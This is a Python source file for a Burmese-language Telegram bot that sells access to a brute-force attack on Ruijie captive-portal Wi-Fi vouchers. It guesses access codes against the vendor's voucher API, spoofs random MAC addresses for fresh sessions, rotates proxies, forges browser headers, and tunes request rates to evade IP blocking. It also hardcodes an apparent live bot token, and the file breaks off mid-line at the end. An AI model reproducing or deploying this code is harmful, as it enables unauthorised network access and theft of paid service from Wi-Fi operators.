# -*- coding: utf-8 -*-
import os
import re
import math
import time
import string
import random
import asyncio
import aiohttp
from aiohttp import web
import aiosqlite
from typing import Callable, Dict, Any, Awaitable
from aiogram import Bot, Dispatcher, types, BaseMiddleware
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

class RateLimiter:
    def __init__(self, rate_limit_per_second: float):
        self.rate_limit_per_second = rate_limit_per_second
        self.tokens = rate_limit_per_second
        self.last_check = time.time()
        self.lock = asyncio.Lock()

    async def acquire(self):
        sleep_time = 0
        async with self.lock:
            now = time.time()
            elapsed = now - self.last_check
            self.last_check = now
            self.tokens = min(self.rate_limit_per_second, self.tokens + elapsed * self.rate_limit_per_second)

            if self.tokens < 1:
                sleep_time = (1 - self.tokens) / self.rate_limit_per_second
                self.tokens = 0
            else:
                self.tokens -= 1
        
        if sleep_time > 0:
            await asyncio.sleep(sleep_time)

# --- Configuration ---
BOT_TOKEN="8940069213:AAFyrS1SRM0XaR3mT53o_HGSk2J-TCpsDqc"
BOT_ID = "bot1"

# Render Cloud ပေါ်တွင် Error မတက်စေရန် လမ်းကြောင်းအား ပြင်ဆင်ခြင်း
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
MASTER_DB = os.path.join(BASE_DIR, "ruijie_master.db")

ADMIN_ID = 8766883390
ADMIN_USERNAME = "@waymaker0456"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
db = None

# 🌟 Safe Limits (Ruijie IP Block မခံရစေရန် အလုံခြုံဆုံး သတ်မှတ်ချက်)
ADMIN_RATE_LIMIT = 2500 
USER_RATE_LIMIT = 1500  
admin_limiter = RateLimiter(ADMIN_RATE_LIMIT)
user_limiter = RateLimiter(USER_RATE_LIMIT)

# --- State Tracking ---
active_tasks = {}
stop_events = {}
task_stats = {}
resume_states = {}
batch_writes = {}

def init_user_state(tg_id):
    if tg_id not in stop_events: stop_events[tg_id] = asyncio.Event()
    if tg_id not in task_stats: task_stats[tg_id] = {"attempts": 0, "found": 0, "success_count": 0, "target_success": None, "status": "Idle", "speed": 0}
    if tg_id not in resume_states: resume_states[tg_id] = {"mode": None, "length": None, "start_offset": None, "current_idx": 0, "target_success": None}
    if tg_id not in batch_writes: batch_writes[tg_id] = []

def get_user_db_path(tg_id):
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(BASE_DIR, f"user_data_{tg_id}.db")

# ==========================================
# 💾 SQLite Micro-Database Engine
# ==========================================
async def init_db():
    global db
    db = await aiosqlite.connect(MASTER_DB, timeout=20.0)
    db.row_factory = aiosqlite.Row
    await db.execute("PRAGMA journal_mode=WAL;")
    
    await db.execute('''CREATE TABLE IF NOT EXISTS tg_users (
        tg_id INTEGER PRIMARY KEY,
        approval_type TEXT,
        expires_at REAL,
        allowed_codes INTEGER,
        found_codes INTEGER,
        session_url TEXT,
        current_setup_id TEXT,
        old_setup_id TEXT,
        live_notify INTEGER,
        is_running INTEGER,
        assigned_bot TEXT,
        saved_views_after_expiry INTEGER
    )''')
    await db.execute('''CREATE TABLE IF NOT EXISTS bot_settings (
        id TEXT PRIMARY KEY,
        user_workers INTEGER,
        admin_workers INTEGER
    )''')
    await db.commit()

async def init_user_db(tg_id):
    db_path = get_user_db_path(tg_id)
    async with aiosqlite.connect(db_path, timeout=20.0) as udb:
        await udb.execute("PRAGMA journal_mode=WAL;")
        await udb.execute('''CREATE TABLE IF NOT EXISTS vouchers (
            code TEXT,
            setup_id TEXT,
            status TEXT,
            PRIMARY KEY (code, setup_id)
        )''')
        await udb.commit()

async def get_user(tg_id):
    async with db.execute("SELECT * FROM tg_users WHERE tg_id=?", (tg_id,)) as c:
        row = await c.fetchone()
        return dict(row) if row else None

async def update_user(tg_id, data):
    async with db.execute("SELECT tg_id FROM tg_users WHERE tg_id=?", (tg_id,)) as c:
        exists = await c.fetchone()
    if exists:
        set_clause = ", ".join(f"{k}=?" for k in data.keys())
        values = list(data.values()) + [tg_id]
        await db.execute(f"UPDATE tg_users SET {set_clause} WHERE tg_id=?", values)
    else:
        cols = ", ".join(data.keys())
        placeholders = ", ".join("?" for _ in data)
        values = [tg_id] + list(data.values())
        await db.execute(f"INSERT INTO tg_users (tg_id, {cols}) VALUES (?, {placeholders})", values)
    await db.commit()

async def inc_found_codes(tg_id):
    async with db.execute("SELECT found_codes, allowed_codes, approval_type FROM tg_users WHERE tg_id=?", (tg_id,)) as c:
        row = await c.fetchone()
        if row:
            new_val = (row["found_codes"] or 0) + 1
            await db.execute("UPDATE tg_users SET found_codes=? WHERE tg_id=?", (new_val, tg_id))
            await db.commit()
            return {"found_codes": new_val, "allowed_codes": row["allowed_codes"], "approval_type": row["approval_type"]}
    return None

async def get_user_worker_count():
    async with db.execute("SELECT user_workers FROM bot_settings WHERE id='config'") as c:
        row = await c.fetchone()
        return row["user_workers"] if row and row["user_workers"] else 80

async def set_user_worker_count(count):
    async with db.execute("SELECT id FROM bot_settings WHERE id='config'") as c:
        exists = await c.fetchone()
    if exists:
        await db.execute("UPDATE bot_settings SET user_workers=? WHERE id='config'", (count,))
    else:
        await db.execute("INSERT INTO bot_settings (id, user_workers) VALUES ('config', ?)", (count,))
    await db.commit()

async def get_admin_worker_count():
    async with db.execute("SELECT admin_workers FROM bot_settings WHERE id='config'") as c:
        row = await c.fetchone()
        return row["admin_workers"] if row and row["admin_workers"] else 300

async def set_admin_worker_count(count):
    async with db.execute("SELECT id FROM bot_settings WHERE id='config'") as c:
        exists = await c.fetchone()
    if exists:
        await db.execute("UPDATE bot_settings SET admin_workers=? WHERE id='config'", (count,))
    else:
        await db.execute("INSERT INTO bot_settings (id, admin_workers) VALUES ('config', ?)", (count,))
    await db.commit()

# --- Proxy Setup ---
PROXIES = []
try:
    proxy_path = os.path.join(BASE_DIR, "proxies.txt")
    if os.path.exists(proxy_path):
        with open(proxy_path, "r") as f:
            PROXIES = [line.strip() for line in f if line.strip() and line.startswith("http")]
except Exception:
    pass

def get_random_proxy():
    if PROXIES: return random.choice(PROXIES)
    return None

# ==========================================
# 🛡️ Middleware
# ==========================================
class AccessMiddleware(BaseMiddleware):
    async def __call__(self, handler: Callable[[types.Message, Dict[str, Any]], Awaitable[Any]], event: types.Message, data: Dict[str, Any]) -> Any:
        if isinstance(event, types.CallbackQuery):
             tg_id = event.from_user.id
             if any(event.data.startswith(p) for p in ['admin_']):
                 if tg_id != ADMIN_ID:
                     await event.answer("⛔ Admin Only.", show_alert=True)
                     return
             else:
                  user = await get_user(tg_id)
                  is_active = False
                  if user:
                      if user.get("approval_type") == "count":
                          is_active = (user.get("found_codes") or 0) < (user.get("allowed_codes") or 0)
                      else:
                          is_active = time.time() < (user.get("expires_at") or 0)
                  if tg_id != ADMIN_ID and not is_active:
                        await event.answer("⚠️ အသုံးပြုခွင့် မရှိပါ။", show_alert=True)
                        return
             return await handler(event, data)
             
        if not isinstance(event, types.Message): return await handler(event, data)
        tg_id = event.from_user.id
        if tg_id == ADMIN_ID: return await handler(event, data)
        if event.text and event.text.startswith('/start'): return await handler(event, data)
            
        user = await get_user(tg_id)
        is_active = False
        is_expired = False
        if user:
            if user.get("approval_type") == "count":
                is_active = (user.get("found_codes") or 0) < (user.get("allowed_codes") or 0)
            else:
                is_active = time.time() < (user.get("expires_at") or 0)
            is_expired = not is_active
                
        if is_active:
            if tg_id != ADMIN_ID:
                assigned_bot = user.get("assigned_bot") or "bot1"
                if assigned_bot != "any" and assigned_bot != BOT_ID:
                    msg_text = f"⛔ တားမြစ်ထားသည်။ သင်သည် ဤ Bot ကို အသုံးပြုခွင့် မရှိပါ။\n👉 ကျေးဇူးပြု၍ {assigned_bot.upper()} သို့ သွားရောက် အသုံးပြုပါ။"
                    await event.answer(msg_text)
                    return
            return await handler(event, data)
        else:
            if event.text and (event.text.startswith('/saved') or event.text.startswith('/refresh')) and is_expired:
                return await handler(event, data)
            elif event.text and event.text.startswith('/'):
                await event.answer(f"⚠️ သင်၏ အသုံးပြုခွင့် မရှိပါ (သို့) ပြည့်သွားပါပြီ။ Admin ကို ဆက်သွယ်ပါ။", parse_mode="Markdown")
            return

dp.message.middleware(AccessMiddleware())
dp.callback_query.middleware(AccessMiddleware())

# ==========================================
# 👑 Admin UI & Commands
# ==========================================
def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton(text="👥 View Users", callback_data="admin_view_users")],
        [
            InlineKeyboardButton(text="⏱️ Add Time", callback_data="admin_add_time_user"),
            InlineKeyboardButton(text="🔢 Add Count", callback_data="admin_add_count_user")
        ],
        [
            InlineKeyboardButton(text="⚡ User Speed", callback_data="admin_set_workers"),
            InlineKeyboardButton(text="🚀 Admin Speed", callback_data="admin_set_admin_workers")
        ],
        [
            InlineKeyboardButton(text="➖ Remove User", callback_data="admin_remove_user"),
            InlineKeyboardButton(text="🗑️ Clear Saved", callback_data="admin_clear_saved")
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

@dp.message(Command("admin"))
async def cmd_admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("🛠️ **Admin Control Panel** 🛠️\n\nWelcome Admin!", reply_markup=get_admin_keyboard(), parse_mode="Markdown")

@dp.callback_query(lambda c: c.data and c.data.startswith('admin_'))
async def process_admin_callback(callback_query: types.CallbackQuery):
    action = callback_query.data
    if action == "admin_view_users":
        msg, count = "👥 **လက်ရှိခွင့်ပြုထားသော User များ:**\n\n", 0
        async with db.execute("SELECT * FROM tg_users") as c:
            async for row in c:
                user = dict(row)
                app_type = user.get("approval_type", "time")
                assigned_bot = (user.get("assigned_bot") or "bot1").upper()
                if app_type == "count":
                    rem_codes = (user.get("allowed_codes") or 0) - (user.get("found_codes") or 0)
                    if rem_codes > 0:
                        count += 1; msg += f"ID: `{user['tg_id']}` | Bot: {assigned_bot} | ကျန် Code: {rem_codes} ခု\n"
                else:
                    rem_time = (user.get("expires_at") or 0) - time.time()
                    if rem_time > 0:
                        count += 1; hours, mins = int(rem_time // 3600), int((rem_time % 3600) // 60)
                        msg += f"ID: `{user['tg_id']}` | Bot: {assigned_bot} | ကျန်ချိန်: {hours}h {mins}m\n"
        if count == 0: msg += "လက်ရှိ ခွင့်ပြုပေးထားသူ မရှိပါ။"
        await callback_query.message.answer(msg, parse_mode="Markdown")
        
    elif action == "admin_add_time_user":
        await callback_query.message.answer("⏱️ အချိန်ဖြင့် ခွင့်ပြုရန်\n👉 `/adduser <tg_id> <hours>`", parse_mode="Markdown")
    elif action == "admin_add_count_user":
        await callback_query.message.answer("🔢 Code အရေအတွက်ဖြင့် ခွင့်ပြုရန်\n👉 `/addcount <tg_id> <code_count>`", parse_mode="Markdown")
    elif action == "admin_set_workers":
        await callback_query.message.answer("⚡ User များ၏ Speed ပြင်ရန်\n👉 `/setworkers <number>`", parse_mode="Markdown")
    elif action == "admin_set_admin_workers":
        await callback_query.message.answer("🚀 Admin ၏ Speed ပြင်ရန်\n👉 `/worker_admin <number>`", parse_mode="Markdown")
    elif action == "admin_remove_user":
         await callback_query.message.answer("✏️ User ဖယ်ရှားရန်\n👉 `/removeuser <tg_id>`", parse_mode="Markdown")
    elif action == "admin_clear_saved":
         await callback_query.message.answer("🗑️ User ၏ Code များဖျက်ရန်\n👉 `/clearsaved <tg_id>`", parse_mode="Markdown")
    await callback_query.answer()

@dp.message(Command("assign"))
async def cmd_assign(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 3: return await message.answer("Usage: `/assign <tg_id> <bot1/bot2/bot3/any>`", parse_mode="Markdown")
    try: target_id = int(args[1])
    except: return await message.answer("❌ Invalid TG ID")
    target_bot = args[2].lower()
    if target_bot not in ["bot1", "bot2", "bot3", "any"]:
        return await message.answer("❌ မှားယွင်းနေပါသည်။ bot1, bot2, bot3 သို့မဟုတ် any သာ ရိုက်ပါ။")
    
    await update_user(target_id, {"assigned_bot": target_bot})
    await message.answer(f"✅ User `{target_id}` ကို `{target_bot.upper()}` သို့ ရွှေ့ပြောင်း သတ်မှတ်လိုက်ပါပြီ。\n*(အကယ်၍ ၎င်းသည် ယခင် Bot တွင် Task အဟောင်း Run နေပါက ၃ စက္ကန့်အတွင်း အလိုအလျောက် ရပ်တန့်သွားပါမည်)*", parse_mode="Markdown")

@dp.message(Command("adduser"))
async def cmd_adduser(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 3: return
    try: target_id, hours = int(args[1]), float(args[2])
    except: return
    expires_at = time.time() + (hours * 3600)
    await update_user(target_id, {"approval_type": "time", "expires_at": expires_at, "saved_views_after_expiry": 0})
    await message.answer(f"✅ User `{target_id}` ကို အချိန် `{hours}` နာရီဖြင့် ခွင့်ပြုလိုက်ပါပြီ。", parse_mode="Markdown")

@dp.message(Command("addcount"))
async def cmd_addcount(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 3: return
    try: target_id, count = int(args[1]), int(args[2])
    except: return
    await update_user(target_id, {"approval_type": "count", "allowed_codes": count, "found_codes": 0, "saved_views_after_expiry": 0})
    await message.answer(f"✅ User `{target_id}` ကို Code အရေအတွက် `{count}` ခုဖြင့် ရှာဖွေခွင့် ပေးလိုက်ပါပြီ。", parse_mode="Markdown")

@dp.message(Command("removeuser"))
async def cmd_removeuser(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2: return
    try: target_id = int(args[1])
    except: return
    await update_user(target_id, {"approval_type": "expired", "expires_at": 0, "allowed_codes": 0})
    await message.answer(f"🗑️ User `{target_id}` ကို ဖြုတ်ချလိုက်ပါပြီ。", parse_mode="Markdown")

@dp.message(Command("clearsaved"))
async def cmd_clearsaved(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2: return
    try: target_id = int(args[1])
    except: return
    
    user_db_path = get_user_db_path(target_id)
    if os.path.exists(user_db_path):
        async with aiosqlite.connect(user_db_path, timeout=20.0) as udb:
            async with udb.execute("DELETE FROM vouchers") as c:
                deleted = c.rowcount
            await udb.commit()
        await message.answer(f"✅ User `{target_id}` ၏ Code အဟောင်း ({deleted}) ခုကို ဖျက်လိုက်ပါပြီ。", parse_mode="Markdown")
    else:
        await message.answer(f"✅ User `{target_id}` ၏ ဖျက်ရန် Code မရှိပါ။", parse_mode="Markdown")

@dp.message(Command("setworkers"))
async def cmd_setworkers(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2: return await message.answer("Usage: `/setworkers <number>`")
    try: new_workers = int(args[1])
    except: return await message.answer("❌ ဂဏန်းသာ ထည့်ပါ။")
    await set_user_worker_count(new_workers)
    await message.answer(f"✅ User များ၏ Speed (Worker) ကို `{new_workers}` သို့ ပြောင်းလဲသတ်မှတ်လိုက်ပါပြီ。", parse_mode="Markdown")

@dp.message(Command("worker_admin"))
async def cmd_worker_admin(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) != 2: return await message.answer("Usage: `/worker_admin <number>`")
    try: new_workers = int(args[1])
    except: return await message.answer("❌ ဂဏန်းသာ ထည့်ပါ။")
    await set_admin_worker_count(new_workers)
    await message.answer(f"✅ Admin ၏ Speed (Worker) ကို `{new_workers}` သို့ ပြောင်းလဲသတ်မှတ်လိုက်ပါပြီ。", parse_mode="Markdown")

# ==========================================
# ⚙️ Core Logic - THE SAFE & STABLE ENGINE
# ==========================================
def generate_mac():
    m = [random.randint(0x00, 0xff) for _ in range(6)]
    m[0] = (m[0] | 0x02) & 0xfe
    return ':'.join(f'{x:02x}' for x in m)

async def get_session_id(session, url, current_sid, proxy=None):
    if not url: return current_sid
    n_m = generate_mac()
    s_u_s = re.sub(r'mac=[^&]+', f'mac={n_m}', url) if 'mac=' in url else url
    
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'referer': s_u_s,
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.get(s_u_s, headers=headers, proxy=proxy, timeout=5) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: return current_sid

async def check_voucher(session, session_id, voucher, proxy=None):
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.post(post_url, headers=headers, json=data, proxy=proxy, timeout=5) as req:
            res = await req.text()
            if "logonUrl" in res: return "SUCCESS"
            elif "STA" in res: return "LIMITED"
            elif "failed" in res or "expired" in res: return "FAILED"
    except: return "ERROR"
    return "FAILED"

d
